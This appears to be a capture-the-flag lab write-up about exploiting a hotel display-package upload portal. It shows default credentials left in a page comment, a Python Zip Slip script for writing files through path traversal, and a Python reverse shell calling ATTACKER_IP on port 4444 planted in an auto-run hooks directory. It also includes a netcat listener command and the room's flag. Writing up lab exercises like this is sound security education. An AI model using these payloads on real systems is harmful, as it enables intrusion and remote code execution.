This room presented a web application for a beachfront hotel’s “Shoreline Display” portal, where staff could upload display packages (“shells”) to personalize in-room ambiance screens. The premise hinted strongly at a file upload vulnerability, and the challenge was to find what the portal failed to validate before an uploaded file could be executed as code.

![](https://cdn-images-1.medium.com/max/1000/1*KVR_2ok0grMa1alJ5kcd1w.png)

The application was running on port 5000, suggesting a lightweight backend framework rather than a traditional web server on port 80/443. The entry point was a staff sign-in page restricting access to authorized personnel only.

Reviewing the page source revealed a comment left behind by IT containing default onboarding credentials meant to be rotated on first login — a classic case of a security control existing on paper but not being enforced in practice:

![](https://cdn-images-1.medium.com/max/1000/1*j0RNPOcr5T9YqVlVAbuIQA.png)

user: concierge  
pass: StayNoticed2024!

![](https://cdn-images-1.medium.com/max/1000/1*0nZqTTG0GdkdjSYqQdrZtQ.png)

A baseline upload (a minimal `shell.json`) worked fine and got extracted to `shells/<id>/`, directly browsable over HTTP. To test whether the extraction validated entry paths, a zip was crafted with a manipulated entry name using Python's `zipfile`:

import zipfile  
with zipfile.ZipFile("test.zip", "a") as z:  
    z.writestr("../../../../tmp/pwned_test.txt", "zip slip works")

The upload succeeded silently, with no rejection of the malicious path — confirming the server extracts zip entries without sanitizing `../` sequences (Zip Slip / arbitrary file write).

The portal’s own hint text (“a shell may include optional automation hooks — the theme worker applies these for you shortly after the shell comes ashore”) pointed to a `hooks/` directory at the app root that gets auto-executed. Using the same Zip Slip technique, a Python reverse shell was written straight into that directory instead of a scratch file:

import zipfile, json

manifest = {"name": "reverse", "assets": []}

callback = '''  
import socket, os, pty  
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
sock.connect(("ATTACKER_IP", 4444))  
for fd in (0, 1, 2):  
    os.dup2(sock.fileno(), fd)  
pty.spawn("/bin/bash")  
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as z:  
    z.writestr("shell.json", json.dumps(manifest))  
    z.writestr("../../hooks/callback.py", callback)


A listener was started on the attack box:

nc -lvnp 4444

The crafted `reverse-shell.zip` was uploaded through the portal. Shortly after, the theme worker picked up and executed the planted hook, and a connection came back:

roomservice@tryhackme-2404:/var/www/conch$

Full code execution as `roomservice`, confirming the chain: Zip Slip -> arbitrary file write into `hooks/` -> automatic hook execution -> RCE

With shell access as `roomservice`, the flag was located directly in the `roomservice` working directory - no further privilege escalation was needed.

![](https://cdn-images-1.medium.com/max/1000/1*1QnYRORoY9rYxrxOs5c2lA.png)

#### flag : THM{z1p_sl1pp3d_1nt0_a_sh3ll}